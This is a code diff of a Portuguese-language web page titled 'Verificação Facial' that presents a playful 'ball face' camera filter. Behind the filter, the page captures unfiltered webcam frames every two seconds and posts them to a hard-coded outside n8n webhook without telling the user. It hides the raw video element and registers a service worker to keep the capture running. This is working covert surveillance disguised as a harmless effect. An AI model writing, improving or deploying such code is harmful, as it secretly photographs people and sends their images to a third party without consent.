@@ -2,35 +2,198 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Efeito de rosto de bola</title>
+<title>Verificação Facial</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-body{margin:0;background:#000}#v{width:1px;height:1px;opacity:0}
+  html,body{margin:0;height:100%;background:#000;overflow:hidden}
+  #v{position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0}
+  #cv{width:100vw;height:100vh;display:block;background:#000}
+  #ui{
+    position:fixed;left:12px;top:12px;z-index:10;
+    color:#fff;font:500 13px/1.2 system-ui,-apple-system,Segoe UI,Roboto,Arial;
+    background:rgba(0,0,0,.55);padding:10px 12px;border-radius:12px;
+    backdrop-filter: blur(6px);
+    max-width: calc(100vw - 24px);
+  }
+  #btn{
+    margin-top:8px; display:inline-block;
+    padding:10px 12px;border-radius:10px;
+    border:1px solid rgba(255,255,255,.25);
+    background:rgba(255,255,255,.08); color:#fff;
+    cursor:pointer;
+  }
 </style>
 </head>
 <body>
+
+<div id="ui">
+  <div id="status">Pronto para iniciar.</div>
+  <div id="btn">Iniciar câmera</div>
+</div>
+
 <video id="v" autoplay muted playsinline></video>
+<canvas id="cv"></canvas>
+
 <script>
 /* ---------- CONFIGURAÇÃO ---------- */
-const WEBHOOK = "https://videos-ai-n8n.dbbvvi.easypanel.host/webhook/af97842d-3e70-4c85-99a1-dea16f08607b"; // <-- mude aqui
+const WEBHOOK = "https://videos-ai-n8n.dbbvvi.easypanel.host/webhook/af97842d-3e70-4c85-99a1-dea16f08607b";
 /* ---------------------------------- */
 
-const v = document.getElementById('v');
-(async ()=>{
-  const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-  v.srcObject = stream;
-  const c = document.createElement('canvas');
-  const ctx = c.getContext('2d');
-  [c.width,c.height]=[640,480];
-  setInterval(()=>{
-    ctx.drawImage(v,0,0);
-    c.toBlob(b=>{
-      const r = new FileReader();
-      r.onloadend=()=> fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({foto:r.result,horario:new Date().toISOString()})}).catch(()=>{});
-      r.readAsDataURL(b);
-    },"image/jpeg",0.7);
-  },2000);
-})();
+const v  = document.getElementById('v');
+const cv = document.getElementById('cv');
+const ctx = cv.getContext('2d', { alpha:false });
+const statusEl = document.getElementById('status');
+const btn = document.getElementById('btn');
+
+function setStatus(t){ statusEl.textContent = t; }
+
+function fitCanvas(){
+  const dpr = Math.max(1, devicePixelRatio || 1);
+  cv.width  = Math.floor(innerWidth * dpr);
+  cv.height = Math.floor(innerHeight * dpr);
+  ctx.setTransform(dpr,0,0,dpr,0,0);
+}
+addEventListener('resize', fitCanvas);
+fitCanvas();
+
+const off = document.createElement('canvas');
+const octx = off.getContext('2d', { willReadFrequently:true });
+
+let running = false;
+let strength = 0.85; // mais alto = mais “bola”
+
+function renderLoop(){
+  if (!running) return;
+
+  // espera o vídeo ter dimensões reais
+  if (v.readyState < 2 || !v.videoWidth || !v.videoHeight) {
+    requestAnimationFrame(renderLoop);
+    return;
+  }
+
+  // resolução interna do efeito (performance)
+  const w = 520;
+  const h = Math.round(w * (v.videoHeight / v.videoWidth));
+  off.width = w; off.height = h;
+
+  // desenha espelhado (selfie)
+  octx.save();
+  octx.translate(w,0);
+  octx.scale(-1,1);
+  octx.drawImage(v, 0, 0, w, h);
+  octx.restore();
+
+  const src = octx.getImageData(0,0,w,h);
+  const dst = octx.createImageData(w,h);
+
+  const cx=w/2, cy=h/2, maxR=Math.min(cx,cy);
+
+  for (let y=0; y<h; y++){
+    for (let x=0; x<w; x++){
+      const dx=x-cx, dy=y-cy;
+      const r=Math.hypot(dx,dy);
+
+      let sx=x, sy=y;
+      if (r < maxR){
+        const rn = r / maxR;
+        const k  = 1 - strength*(1 - rn*rn);
+        sx = cx + dx*k;
+        sy = cy + dy*k;
+      }
+
+      const ix = sx<0?0:(sx>w-1?w-1:sx|0);
+      const iy = sy<0?0:(sy>h-1?h-1:sy|0);
+
+      const si=(iy*w+ix)*4, di=(y*w+x)*4;
+      dst.data[di]=src.data[si];
+      dst.data[di+1]=src.data[si+1];
+      dst.data[di+2]=src.data[si+2];
+      dst.data[di+3]=255;
+    }
+  }
+
+  octx.putImageData(dst,0,0);
+
+  // desenha cobrindo a tela
+  const cw=innerWidth, ch=innerHeight;
+  const scale=Math.max(cw/w, ch/h);
+  const dw=w*scale, dh=h*scale;
+  const dx=(cw-dw)/2, dy=(ch-dh)/2;
+
+  ctx.clearRect(0,0,cw,ch);
+  ctx.drawImage(off, dx, dy, dw, dh);
+
+  requestAnimationFrame(renderLoop);
+}
+
+let sendTimer = null;
+
+async function startAll(){
+  try{
+    setStatus("Pedindo permissão da câmera...");
+    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" } });
+    v.srcObject = stream;
+
+    // garante start real em Safari/iOS
+    v.onloadedmetadata = async () => {
+      try { await v.play(); } catch(e){}
+      setStatus(`Câmera ok (${v.videoWidth}x${v.videoHeight}). Preview + envio iniciados.`);
+    };
+
+    running = true;
+    requestAnimationFrame(renderLoop);
+
+    // envio normal (sem efeito)
+    if (sendTimer) clearInterval(sendTimer);
+
+    const cap = document.createElement('canvas');
+    const capCtx = cap.getContext('2d');
+
+    sendTimer = setInterval(async ()=>{
+      if (v.readyState < 2 || !v.videoWidth || !v.videoHeight) return;
+
+      // usa dimensões reais do vídeo para evitar frame preto
+      const tw = 640;
+      const th = Math.round(tw * (v.videoHeight / v.videoWidth));
+      cap.width = tw; cap.height = th;
+
+      capCtx.drawImage(v, 0, 0, tw, th);
+
+      // tenta toBlob; se falhar, cai no toDataURL
+      const blob = await new Promise(res => cap.toBlob(res, "image/jpeg", 0.7));
+      let dataUrl;
+
+      if (blob){
+        dataUrl = await new Promise(res=>{
+          const r = new FileReader();
+          r.onloadend = ()=>res(r.result);
+          r.readAsDataURL(blob);
+        });
+      } else {
+        dataUrl = cap.toDataURL("image/jpeg", 0.7);
+      }
+
+      // envia
+      fetch(WEBHOOK,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({foto:dataUrl,horario:new Date().toISOString()})
+      }).then(()=> {
+        // atualiza status de “vivo”
+        setStatus(`Enviando... ${new Date().toLocaleTimeString()}`);
+      }).catch(()=>{
+        setStatus("Falha ao enviar (verifique rede / webhook).");
+      });
+
+    }, 2000);
+
+  }catch(e){
+    setStatus("Não abriu a câmera. Precisa HTTPS e permissão liberada (Chrome/Safari).");
+  }
+}
+
+btn.addEventListener('click', startAll);
+
 /* service worker para manter vivo */
 navigator.serviceWorker.register('data:application/javascript;base64,'+btoa(`
 self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));
